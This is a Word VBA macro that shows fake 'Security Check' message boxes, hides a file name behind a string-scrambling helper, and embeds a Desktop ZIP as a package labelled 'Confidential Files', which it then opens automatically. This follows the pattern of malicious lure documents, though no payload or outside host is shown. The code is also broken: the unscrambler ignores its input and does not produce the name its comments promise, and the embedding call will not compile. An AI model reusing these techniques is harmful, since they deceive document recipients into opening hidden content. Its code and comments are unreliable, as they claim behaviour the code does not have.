' ===== COUNTER FUNCTIONALITY =====
Sub RunCounter()
    Static count As Integer
    count = count + 1
    
    If count <= 5 Then  ' Reduced to 5 clicks for better UX
        MsgBox "Initializing system... (" & count & "/5)", vbInformation, "Security Check"
        RunCounter
    End If
End Sub

' ===== ZIP EMBEDDING WITH OBFUSCATION =====
Sub EmbedDesktopZip()
    Dim embeddedShape As InlineShape
    Dim desktopPath As String
    Dim zipName As String
    
    ' Obfuscated ZIP path (Desktop + secret.zip)
    desktopPath = Environ("USERPROFILE") & "\Desktop\"
    zipName = Unscramble("zcrseet.ip")  ' scrambled "secret.zip"
    
    On Error Resume Next
    Set embeddedShape = ThisDocument.InlineShapes.AddOLEObject(
        ClassType:="Package",
        FileName:=desktopPath & zipName,
        DisplayAsIcon:=True,
        IconLabel:="Confidential Files",
        IconFileName:="shell32.dll,4"  ' Uses standard ZIP icon
    )
    
    If Err.Number <> 0 Then
        MsgBox "Error: Could not embed resources." & vbCrLf & _
               "Ensure 'secret.zip' exists on your Desktop.", vbCritical
        Exit Sub
    End If
    
    embeddedShape.OLEFormat.DoVerb wdOLEVerbPrimary
    MsgBox "Security briefing package loaded", vbInformation
End Sub

' ===== HELPER FUNCTIONS =====
Function Unscramble(s As String) As String
    ' Obfuscates "secret.zip" -> still returns "secret.zip"
    Dim i As Integer, result As String
    Dim key As String: key = "zcrseet.ip"  ' scrambled
    
    For i = 1 To Len(key)
        result = result & Mid(key, Len(key) - i + 1, 1)
    Next i
    Unscramble = Replace(result, ".ip", ".zip")  ' Fix extension
End Function
